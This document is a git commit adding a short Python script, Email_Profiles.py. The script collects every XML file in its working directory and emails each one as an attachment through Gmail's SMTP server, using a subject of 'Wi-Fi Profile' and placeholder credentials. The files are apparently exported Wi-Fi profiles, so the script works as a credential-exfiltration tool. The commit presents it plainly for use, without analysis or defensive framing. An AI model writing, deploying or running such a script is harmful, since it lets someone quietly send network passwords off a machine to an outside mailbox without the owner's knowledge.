f6a8d1272c6c9dc193741c5c8d98c1f07425e4ae
Hunt The Alien <36826771+lalenguanegra@users.noreply.github.com>
2020-08-15 06:58:42 -0700

    Create Email_Profiles.py

---
+++ Email_Profiles.py
@@ -0,0 +1,60 @@
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import time
+import glob
+
+def test():
+  ok = glob.glob('*.xml')
+  alright = ("[]".join(ok))
+  x = alright.replace("[]", "\n")
+  print(x)
+  f = open("1.txt", "a")
+  f.write(x)
+  f.close()
+  with open('1.txt', 'r') as f:
+       for line in f:
+         temp = line.rstrip('\n')
+         print(temp)
+         time.sleep(5)
+         fromaddr = "MY_EMAIL"
+         toaddr = "MY_EMAIL"
+
+         msg = MIMEMultipart()
+
+         msg['From'] = fromaddr
+         msg['To'] = toaddr
+         msg['Subject'] = "Wi-Fi Profile"
+		
+         body = ":)"
+
+
+
+         msg.attach(MIMEText(body, 'plain'))
+         
+         filename = temp
+         attachment = open(filename, "rb")
+
+         part = MIMEBase('application', 'octet-stream')
+         part.set_payload((attachment).read())
+         encoders.encode_base64(part)
+         part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+         msg.attach(part)
+
+
+         server = smtplib.SMTP('smtp.gmail.com', 587)
+         server.starttls()
+         server.login(fromaddr, "MY_Password")
+         text = msg.as_string()
+         server.sendmail(fromaddr, toaddr, text)
+         server.quit()
+         
+
+numberEmails = 1
+
+for _ in range(numberEmails):
+    test()
+    open('1.txt', 'w').close()
